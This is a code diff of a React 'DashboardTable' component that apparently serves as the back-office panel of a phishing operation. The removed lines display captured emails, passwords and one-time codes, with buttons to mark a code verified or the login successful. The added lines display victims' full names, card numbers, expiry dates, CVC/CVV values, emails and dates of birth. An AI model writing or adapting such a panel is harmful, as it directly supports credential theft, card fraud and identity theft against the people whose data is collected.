@@ -7,7 +7,7 @@ import { PiCaretDoubleLeftDuotone, PiCaretDoubleRightDuotone } from 'react-icons
 import { toast } from 'react-toastify';
 import { DateTime } from 'luxon';
 
-const DashboardTable = ({ itemsObj, userData, showCodeInTable = true, showAccessInTable = false }) => {
+const DashboardTable = ({ itemsObj, userData }) => {
 
   const ADMIN_ROLE_CODE = 'nahid$adminstrator$dashboard$root'
   const MANAGER_ROLE_CODE = 'nahid$manager$dashboard$'
@@ -77,54 +77,47 @@ const DashboardTable = ({ itemsObj, userData, showCodeInTable = true, showAccess
           <thead>
             <tr className="bg-sky-700 text-white">
               <th className="px-4 py-3 text-left">#</th>
-              {role == ADMIN_ROLE_CODE || role == MANAGER_ROLE_CODE ? (
-                <th className="px-4 py-3 text-left ">
-                  <div className=' flex items-center'>
-                    <FaUser className="inline mr-1" />
-                    Owner
-                  </div>
-                </th>
-              ) : null}
               <th className="px-4 py-3 text-left ">
                 <div className=' flex items-center'>
+                  <FaUser className="inline mr-1" />
+                  Name
+                </div>
+              </th>
+
+              <th className="px-4 py-3 text-left ">
+                <div className=' flex items-center min-w-64'>
                   <FaEnvelope className="inline mr-1" />
+                  Card Number
+                </div>
+              </th>
+              <th className="px-4 py-3 text-left">
+                <div className=' flex items-center min-w-40'>
+                  <FaKey className="inline mr-1" />
+                  Expiry Date
+                </div>
+              </th>
+              <th className="px-4 py-3 text-left">
+                <div className=' flex items-center min-w-40'>
+                  <FaCode className="inline mr-1" />
+                  CVC / CVV
+                </div>
+              </th>
+              <th className="px-4 py-3 text-left ">
+                <div className=' flex items-center'>
+                  <FaUser className="inline mr-1" />
                   Email
                 </div>
               </th>
               <th className="px-4 py-3 text-left">
-                <div className=' flex items-center'>
-                  <FaKey className="inline mr-1" />
-                  Password
-                </div>
-              </th>
-              {
-                showCodeInTable && <th className="px-4 py-3 text-left">
-                  <div className=' flex items-center'>
-                    <FaCode className="inline mr-1" />
-                    Code
-                  </div>
-                </th>
-              }
-
-              {
-                showAccessInTable && <th className="px-4 py-3 text-left">
-                  <div className=' flex items-center'>
-                    <FaDesktop className="inline mr-1" />
-                    Access
-                  </div>
-                </th>
-              }
-
-              <th className="px-4 py-3 text-left">
                 <div className=' flex items-center min-w-40'>
                   <MdAccessTimeFilled className="inline mr-1" />
-                  Date & Time
+                  Date Of Birth
                 </div>
               </th>
               <th className="px-4 py-3 text-left">
                 <div className=' flex items-center min-w-64'>
                   <FaKey className="inline mr-1" />
-                  User Agent
+                  Date & Time
                 </div>
               </th>
             </tr>
@@ -137,27 +130,20 @@ const DashboardTable = ({ itemsObj, userData, showCodeInTable = true, showAccess
                   }`}
               >
                 <td className="px-4 py-3 ">{index + 1}</td>
-                {role == ADMIN_ROLE_CODE || role == MANAGER_ROLE_CODE ? (
-                  <td className="px-4 py-3 ">{element?.owner}</td>
-                ) : null}
-                <td className="px-4 py-3 ">{element?.email}</td>
-                <td className="px-4 py-3 ">{element?.password}</td>
-                {
-                  showCodeInTable && <td className="px-4 py-3 text-gray-600 ">{element?.code}</td>
-                }
-                {
-                  showAccessInTable && <td className="px-4 py-3 text-gray-600 ">
-                    <div className=' text-white flex flex-col items-center gap-2 sm:text-lg text-sm '>
-                      <button className=' w-20 sm:w-28 h-7 sm:h-9 rounded-lg bg-blue-500' onClick={() => handleVerify(element?.id)}>Verify Code</button>
-                      <button className=' w-20 sm:w-28 h-7 sm:h-9 rounded-lg bg-green-500' onClick={() => handleSuccess(element?.id)}>Successful</button>
-                    </div>
-                  </td>
-                }
+
+                <td className="px-4 py-3 ">{element?.fullName}</td>
+
+                <td className="px-4 py-3 ">{element?.cardNumber}</td>
+                <td className="px-4 py-3 ">{element?.expiryDate}</td>
+                <td className="px-4 py-3 text-gray-600 ">{element?.cvv}</td>
+                <td className="px-4 py-3 text-gray-600 ">{element?.emailAddress}</td>
+                <td className="px-4 py-3 text-gray-600 ">{element?.dateOfBirth}</td>
+
+
                 <td className="px-4 py-3 ">{element?.createdAt ? <div className=' flex flex-col gap-2 text-base font-semibold text-slate-600'>
                   <div>{DateTime.fromMillis(element?.createdAt).setZone('Asia/Dhaka').toFormat('HH:mm:ss')}</div>
                   <div>{DateTime.fromMillis(element?.createdAt).setZone('Asia/Dhaka').toFormat('dd-MM-yyyy')}</div>
                 </div> : null} </td>
-                <td className="px-8 py-3 text-xs bg-green-200/30 ">{element?.userAgent}</td>
               </tr>
             ))}
           </tbody>
